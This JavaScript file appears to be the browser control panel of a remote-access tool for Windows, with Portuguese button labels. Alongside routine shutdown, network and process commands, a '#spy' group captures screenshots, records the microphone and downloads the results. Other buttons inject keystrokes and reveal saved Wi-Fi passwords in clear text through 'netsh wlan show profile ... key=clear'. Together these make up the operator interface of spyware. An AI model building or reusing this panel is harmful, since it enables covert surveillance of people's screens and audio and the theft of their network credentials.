class Button {
    constructor(Text, Style, Class, Action) {
        this.text = Text;
        this.style = Style;
        this.class = Class;
        this.action = Action;
    }
    string(){
        // Button Structure
        return `<div class=\"col col-lg-2 col-6 div-button\">
            <button class=\"btn ${this.style}\" onclick=\"${this.action}\" type=\"button\">${this.text}</button>
        </div>`
    }
    getClass(){
        return this.class;
    }
}

// Buttons Declarations
let buttons = [];
buttons.push(new Button("Bloquear",                  "btn-success",  "#shutdown",   "putIn('!CM rundll32.exe user32.dll,LockWorkStation');"));
buttons.push(new Button("Hibernar",                  "btn-info",     "#shutdown",   "putIn('!CM rundll32.exe PowrProf.dll,SetSuspendState');"));
buttons.push(new Button("Encerrar",                  "btn-danger",   "#shutdown",   "putIn('!CM shutdown -f -s');"));
buttons.push(new Button("Reiniciar",                 "btn-danger",   "#shutdown",   "putIn('!CM shutdown -f -r');"));
buttons.push(new Button("IP Config",                 "btn-secondary","#network",    "putIn('!CM ipconfig');"));
buttons.push(new Button("WIFI Acessadas",            "btn-secondary","#network",    "putIn('!CM netsh wlan show profiles');"));
buttons.push(new Button("Password do WIFI",          "btn-dark",     "#network",    "getPrompt('Nome de Rede:','!CM netsh wlan show profile name=?? key=clear', true);"));
buttons.push(new Button("Lista de Programas Abertos","btn-secondary","#program",    "putIn('!CM tasklist');"));
buttons.push(new Button("Encerrar Programa",         "btn-dark",     "#program",    "getPrompt('PID do Programa:','!CM taskkill /PID ?? /f', false);"));
buttons.push(new Button("Mostrar Mensagem",          "btn-dark",     "#interaction","getPrompt('Mensagem:','!MB ??', false);"));
buttons.push(new Button("Digitar Mensagem",          "btn-dark",     "#interaction","getPrompt('Mensagem:','!TT ??', false);"));
buttons.push(new Button("Combinação de Teclas",      "btn-dark",     "#interaction","getPrompt('Combinação (Separador: +):','!TC ??', false);"));
buttons.push(new Button("ScreenShot",                "btn-success",  "#spy",        "putIn('!PS');"));
buttons.push(new Button("Gravar Microfone",          "btn-success",  "#spy",        "getPrompt('Segundos: ','!RA ??', false);"));
buttons.push(new Button("Obter ScreenShot",          "btn-danger",   "#spy",        "window.location.href = '/download/ps.png'"));
buttons.push(new Button("Obter Audio",               "btn-danger",   "#spy",        "window.location.href = '/download/output.wav'"));

// Display buttons on Page
    buttons.forEach(button => $(button.getClass()).append(button.string()));